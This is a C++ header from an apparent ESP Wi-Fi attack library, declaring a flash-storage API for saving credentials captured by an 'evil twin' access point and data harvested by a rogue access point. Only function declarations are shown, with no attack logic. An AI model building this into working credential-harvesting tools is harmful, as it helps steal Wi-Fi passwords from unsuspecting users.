/* DeautherX-lib
   https://github.com/BlackTechX011/DeautherX-lib
   MIT License

   DeautherStorage — SPIFFS file storage for captured credentials and harvested data
*/

#pragma once

#include <Arduino.h>

/**
 * DStorage — Simple SPIFFS-backed file appending/reading API for persisting
 * credentials captured by EvilTwin or data harvested by RogueAP.
 *
 * All data is stored in line-delimited JSON or text files in the ESP flash.
 */
namespace DStorage {

    /** Initialize SPIFFS (returns true if successful) */
    bool begin();

    /** Append a string line to a given file. */
    bool appendLine(const char* filepath, const String& line);

    /** Append a captured credential to the standard /credentials.jsonl file */
    bool saveCredential(const char* ssid, const char* password);

    /** Append arbitrary harvested data to the standard /harvested.jsonl file */
    bool saveData(const char* dataType, const String& jsonData);

    /**
     * Read lines from a file, triggering a callback for each line.
     * @param cb Callback function receiving each line. Return true from the
     *           callback to continue reading, false to abort early.
     */
    using ReadCb = bool (*)(const String& line);
    bool readLines(const char* filepath, ReadCb cb);

    /** Count the total number of lines in a file */
    uint32_t countLines(const char* filepath);

    /** Wipe a file entirely */
    bool remove(const char* filepath);

    /** Check if a file exists */
    bool exists(const char* filepath);

    /** Get size of a file in bytes */
    uint32_t size(const char* filepath);

    /** Print file contents directly to Serial (for debugging) */
    void printFile(const char* filepath);

} // namespace DStorage
